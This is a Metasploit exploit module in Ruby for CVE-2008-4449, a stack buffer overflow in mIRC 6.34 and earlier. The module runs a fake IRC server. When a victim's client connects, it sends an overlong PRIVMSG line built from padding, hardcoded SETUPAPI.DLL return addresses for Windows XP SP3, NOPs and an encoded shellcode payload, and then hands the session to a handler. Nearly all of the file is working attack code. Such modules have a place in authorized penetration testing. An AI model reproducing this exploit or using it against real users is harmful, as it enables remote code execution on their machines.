##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::TcpServer
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'mIRC <= 6.34 PRIVMSG Handling Stack Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in the mIRC IRC Client v6.34 and earlier.
				By enticing a mIRC user to connect to this server module, an excessively long PRIVMSG 
				command can be sent, overwriting the stack. Due to size restrictions, ordinal payloads
				may be necessary. This module is based on the code by SkD.
			},
			'Author' 	 => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     => 
				[ 
					[ 'CVE', '2008-4449' ],
					[ 'OSVDB', '48752' ],
					[ 'BID', '31552' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/6666' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 160,
					'BadChars' => "\x00\x07\x0a\x0b\x0c\x0d\x20\x21\x22\x23\x24\x25\x27\x2a\x2c\x2e\x2f\x3a\x3b\x3c\x3e\x3f\x40\x7b\x7c\x7d", # This is mostly a guess plus some RFC info.
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
				# Patrick - Tested against xpsp3 ok 20090715
					[ 'Windows XP SP3', 	{ 'Rets' => [
									0x7792FBD1, # SETUPAPI.DLL pop eax pop ret
									0x7FFDB5B5,
									0x779D87B7, # SETUPAPI.DLL 0x779D87B7 jmp esp
					] } ]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 02 2008',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The IRC server port to listen on", 6667 ]),
				OptString.new('SRVNAME', [ true, "Welcome to the ... IRC Server Name", "Internet Relay Network" ]),
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)	
		print_status("Client connected! Sending payload...")
		buffer = ":my_irc_server.com 001 wow :Welcome to the #{datastore['SRVNAME']} wow\r\n"
		client.put(buffer)
	end

	def on_client_data(client)
		client.get_once
		sleep(2)
		sploit = ":" + Rex::Text.rand_text_alphanumeric(307) + [target['Rets'][0]].pack('V') + [target['Rets'][1]].pack('V')
		sploit << make_nops(4) + [target['Rets'][2]].pack('V') + make_nops(4) + "B" * 12
		sploit << Rex::Arch::X86.jmp_short(3) +Rex::Text.rand_text_alphanumeric(2) 
		sploit << make_nops(4) + payload.encoded + make_nops(4) + " PRIVMSG  wow : /FINGER wow\r\n"
		client.put(sploit)
		
		handler(client)
		service.close_client(client)
	end
end

